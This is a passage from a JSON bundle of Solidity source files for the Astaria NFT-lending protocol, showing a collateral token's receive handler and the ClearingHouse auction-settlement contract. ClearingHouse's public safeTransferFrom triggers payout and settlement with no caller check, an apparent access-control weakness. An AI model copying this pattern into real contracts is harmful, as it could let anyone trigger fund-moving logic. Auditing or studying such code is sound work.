= ClonesWithImmutableArgs.clone(\n          s.ASTARIA_ROUTER.BEACON_PROXY_IMPLEMENTATION(),\n          abi.encodePacked(\n            address(s.ASTARIA_ROUTER),\n            uint8(IAstariaRouter.ImplementationType.ClearingHouse),\n            collateralId\n          )\n        );\n\n        s.clearingHouse[collateralId] = clearingHouse;\n      }\n      ERC721(msg.sender).safeTransferFrom(\n        address(this),\n        s.clearingHouse[collateralId],\n        tokenId_\n      );\n\n      if (msg.sender == address(this) || msg.sender == address(s.LIEN_TOKEN)) {\n        revert InvalidCollateral();\n      }\n\n      _mint(from_, collateralId);\n\n      s.idToUnderlying[collateralId] = Asset({\n        tokenContract: msg.sender,\n        tokenId: tokenId_\n      });\n\n      emit Deposit721(msg.sender, tokenId_, collateralId, from_);\n      return IERC721Receiver.onERC721Received.selector;\n    } else {\n      revert();\n    }\n  }\n\n  modifier whenNotPaused() {\n    if (_loadCollateralSlot().ASTARIA_ROUTER.paused()) {\n      revert ProtocolPaused();\n    }\n    _;\n  }\n}"
    },
    {
      "filename": "src/ClearingHouse.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/**\n *  █████╗ ███████╗████████╗ █████╗ ██████╗ ██╗ █████╗\n * ██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║██╔══██╗\n * ███████║███████╗   ██║   ███████║██████╔╝██║███████║\n * ██╔══██║╚════██║   ██║   ██╔══██║██╔══██╗██║██╔══██║\n * ██║  ██║███████║   ██║   ██║  ██║██║  ██║██║██║  ██║\n * ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝\n *\n * Astaria Labs, Inc\n */\n\npragma solidity =0.8.17;\n\nimport {IAstariaRouter} from \"core/interfaces/IAstariaRouter.sol\";\nimport {WETH} from \"solmate/tokens/WETH.sol\";\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\nimport {SafeTransferLib} from \"solmate/utils/SafeTransferLib.sol\";\nimport {Clone} from \"clones-with-immutable-args/Clone.sol\";\nimport {IERC1155} from \"core/interfaces/IERC1155.sol\";\nimport {ILienToken} from \"core/interfaces/ILienToken.sol\";\nimport {Bytes32AddressLib} from \"solmate/utils/Bytes32AddressLib.sol\";\nimport {\n  ConduitControllerInterface\n} from \"seaport/interfaces/ConduitControllerInterface.sol\";\nimport {AmountDeriver} from \"seaport/lib/AmountDeriver.sol\";\nimport {Order} from \"seaport/lib/ConsiderationStructs.sol\";\nimport {IERC721Receiver} from \"core/interfaces/IERC721Receiver.sol\";\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\n\ncontract ClearingHouse is AmountDeriver, Clone, IERC1155, IERC721Receiver {\n  using Bytes32AddressLib for bytes32;\n  using SafeTransferLib for ERC20;\n\n  struct ClearingHouseStorage {\n    ILienToken.AuctionData auctionStack;\n  }\n\n  uint256 private constant CLEARING_HOUSE_STORAGE_SLOT =\n    uint256(keccak256(\"xyz.astaria.ClearingHouse.storage.location\")) - 1;\n\n  function ROUTER() public pure returns (IAstariaRouter) {\n    return IAstariaRouter(_getArgAddress(0));\n  }\n\n  function COLLATERAL_ID() public pure returns (uint256) {\n    return _getArgUint256(21);\n  }\n\n  function IMPL_TYPE() public pure returns (uint8) {\n    return _getArgUint8(20);\n  }\n\n  function _getStorage()\n    internal\n    pure\n    returns (ClearingHouseStorage storage s)\n  {\n    uint256 slot = CLEARING_HOUSE_STORAGE_SLOT;\n    assembly {\n      s.slot := slot\n    }\n  }\n\n  function setAuctionData(ILienToken.AuctionData calldata auctionData)\n    external\n  {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0)); // get the router from the immutable arg\n\n    //only execute from the conduit\n    require(msg.sender == address(ASTARIA_ROUTER.LIEN_TOKEN()));\n\n    ClearingHouseStorage storage s = _getStorage();\n    s.auctionStack = auctionData;\n  }\n\n  function supportsInterface(bytes4 interfaceId) external view returns (bool) {\n    return interfaceId == type(IERC1155).interfaceId;\n  }\n\n  function balanceOf(address account, uint256 id)\n    external\n    view\n    returns (uint256)\n  {\n    return type(uint256).max;\n  }\n\n  function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)\n    external\n    view\n    returns (uint256[] memory output)\n  {\n    output = new uint256[](accounts.length);\n    for (uint256 i; i < accounts.length; ) {\n      output[i] = type(uint256).max;\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  function setApprovalForAll(address operator, bool approved) external {}\n\n  function isApprovedForAll(address account, address operator)\n    external\n    view\n    returns (bool)\n  {\n    return true;\n  }\n\n  function _execute(\n    address tokenContract, // collateral token sending the fake nft\n    address to, // buyer\n    uint256 encodedMetaData, //retrieve token address from the encoded data\n    uint256 // space to encode whatever is needed,\n  ) internal {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0)); // get the router from the immutable arg\n\n    ClearingHouseStorage storage s = _getStorage();\n    address paymentToken = bytes32(encodedMetaData).fromLast20Bytes();\n\n    uint256 currentOfferPrice = _locateCurrentAmount({\n      startAmount: s.auctionStack.startAmount,\n      endAmount: s.auctionStack.endAmount,\n      startTime: s.auctionStack.startTime,\n      endTime: s.auctionStack.endTime,\n      roundUp: true //we are a consideration we round up\n    });\n    uint256 payment = ERC20(paymentToken).balanceOf(address(this));\n\n    require(payment >= currentOfferPrice, \"not enough funds received\");\n\n    uint256 collateralId = _getArgUint256(21);\n    // pay liquidator fees here\n\n    ILienToken.AuctionStack[] storage stack = s.auctionStack.stack;\n\n    uint256 liquidatorPayment = ASTARIA_ROUTER.getLiquidatorFee(payment);\n\n    ERC20(paymentToken).safeTransfer(\n      s.auctionStack.liquidator,\n      liquidatorPayment\n    );\n\n    ERC20(paymentToken).safeApprove(\n      address(ASTARIA_ROUTER.TRANSFER_PROXY()),\n      payment - liquidatorPayment\n    );\n\n    ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(\n      paymentToken,\n      collateralId,\n      payment - liquidatorPayment,\n      s.auctionStack.stack\n    );\n\n    if (ERC20(paymentToken).balanceOf(address(this)) > 0) {\n      ERC20(paymentToken).safeTransfer(\n        ASTARIA_ROUTER.COLLATERAL_TOKEN().ownerOf(collateralId),\n        ERC20(paymentToken).balanceOf(address(this))\n      );\n    }\n    ASTARIA_ROUTER.COLLATERAL_TOKEN().settleAuction(collateralId);\n  }\n\n  function safeTransferFrom(\n    address from, // the from is the offerer\n    address to,\n    uint256 identifier,\n    uint256 amount,\n    bytes calldata data //empty from seaport\n  ) public {\n    //data is empty and useless\n    _execute(from, to, identifier, amount);\n  }\n\n  function safeBatchTransferFrom(\n    address from,\n    address to,\n    uint256[] calldata ids,\n    uint256[] calldata amounts,\n    bytes calldata data\n  ) public {}\n\n  function onERC721Received(\n    address operator_,\n    address from_,\n    uint256 tokenId_,\n    bytes calldata data_\n  ) external override returns (bytes4) {\n    return IERC721Receiver.onERC721Received.selector;\n  }\n\n  function validateOrder(Order memory order) external {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n    Order[] memory listings = new Order[](1);\n    listings[0] = order;\n\n    ERC721(order.parameters.offer[0].token).approve(\n      ASTARIA_ROUTER.COLLATERAL_TOKEN().getConduit(),\n      order.parameters.offer[0].identifierOrCriteria\n    );\n    ASTARIA_ROUTER.COLLATERAL_TOKEN().SEAPORT().validate(listings);\n  }\n\n  function transferUnderlying(\n    address tokenContract,\n    uint256 tokenId,\n    address target\n  ) external {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n    ERC721(tokenContract).safeTransferFrom(address(this), target, tokenId);\n  }\n\n  function settleLiquidatorNFTClaim() external {\n    IAstariaRouter ASTARIA_ROUTER = IAstariaRouter(_getArgAddress(0));\n\n    require(msg.sender == address(ASTARIA_ROUTER.COLLATERAL_TOKEN()));\n    ClearingHouseStorage storage s = _getStorage();\n    ASTARIA_ROUTER.LIEN_TOKEN().payDebtViaClearingHouse(\n      address(0),\n      COLLATERAL_ID(),\n      0,\n      s.auctionStack.stack\n    );\n  }\n}"
    },
    {
      "filename": "src/CollateralToken.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/**\n *  █████╗ ██"
    }
  ]
}